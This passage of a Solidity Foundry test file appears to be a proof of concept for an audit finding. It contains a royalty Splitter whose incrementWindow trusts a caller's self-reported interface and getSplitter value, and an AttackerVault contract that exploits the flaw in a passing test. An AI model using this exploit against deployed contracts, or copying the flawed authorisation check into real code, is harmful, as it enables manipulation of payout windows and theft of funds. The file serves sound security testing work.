    bytes4 public constant IID_IROYALTY = type(IRoyaltyVault).interfaceId;
    address public splitAsset;
    uint256[] public balanceForWindow;
    uint256 public currentWindow;
    event WindowIncremented(uint256 currentWindow, uint256 fundsAvailable);

    constructor(address _splitAsset) {
        splitAsset = _splitAsset;
    }

    function incrementWindow(uint256 royaltyAmount) public returns (bool) {
        uint256 wethBalance;

        require(
            IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),
            "Royalty Vault not supported"
        );
        require(
            IRoyaltyVault(msg.sender).getSplitter() == address(this),
            "Unauthorised to increment window"
        );

        wethBalance = IERC20(splitAsset).balanceOf(address(this));
        require(wethBalance >= royaltyAmount, "Insufficient funds");

        require(royaltyAmount > 0, "No additional funds for window");
        balanceForWindow.push(royaltyAmount);
        currentWindow += 1;
        emit WindowIncremented(currentWindow, royaltyAmount);
        return true;
    }
}

// Minimal ERC20 for funding the Splitter
contract MockERC20 {
    mapping(address => uint256) public balances;
    function mint(address to, uint256 amount) external { balances[to] += amount; }
    function balanceOf(address who) external view returns (uint256) { return balances[who]; }
    function transfer(address to, uint256 amount) external returns (bool) {
        address from = msg.sender;
        require(balances[from] >= amount, "low");
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }
}

// Attacker contract that implements IRoyaltyVault and tricks the Splitter
contract AttackerVault is IRoyaltyVault {
    address public splitter;

    function attack(address _splitter, uint256 amount) external {
        splitter = _splitter; // getSplitter() will return the target splitter
        Splitter(_splitter).incrementWindow(amount);
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == type(IRoyaltyVault).interfaceId;
    }
    function getSplitter() external view returns (address) { return splitter; }
}

contract SplitterTest is Test {
    Splitter target;
    MockERC20 token;
    AttackerVault vault;
    address attacker;

    function setUp() public {
        token = new MockERC20();
        target = new Splitter(address(token));
        // fund the splitter so incrementWindow's balance check passes
        token.mint(address(target), 1000);
        vault = new AttackerVault();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_incrementWindow() public {
        vm.prank(attacker);
        vault.attack(address(target), 100);
        assertEq(target.currentWindow(), 1);
        assertEq(target.balanceForWindow(0), 100);
    }
}

